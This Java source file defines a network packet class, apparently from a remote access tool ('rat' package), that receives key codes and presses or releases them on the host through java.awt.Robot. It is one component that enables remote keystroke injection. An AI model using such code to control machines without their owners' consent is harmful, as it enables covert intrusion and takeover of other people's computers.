package de.sogomn.rat.packet;

import java.awt.AWTException;
import java.awt.Robot;
import java.awt.event.KeyEvent;

import de.sogomn.rat.ActiveClient;

public final class KeyEventPacket implements IPacket {
	
	private int key;
	private boolean flag;
	
	public KeyEventPacket() {
		key = KeyEvent.VK_UNDEFINED;
	}
	
	public KeyEventPacket(final int key, final boolean flag) {
		this.key = key;
		this.flag = flag;
	}
	
	@Override
	public void send(final ActiveClient client) {
		final byte flagByte = (byte)(flag ? 1 : 0);
		
		client.writeInt(key);
		client.writeByte(flagByte);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		key = client.readInt();
		flag = client.readByte() == 1;
	}
	
	@Override
	public void execute() {
		try {
			final Robot rob = new Robot();
			
			if (flag) {
				rob.keyPress(key);
			} else {
				rob.keyRelease(key);
			}
		} catch (final IllegalArgumentException ex) {
			System.err.println("No valid key code");
		} catch (final AWTException ex) {
			ex.printStackTrace();
		}
	}
	
}
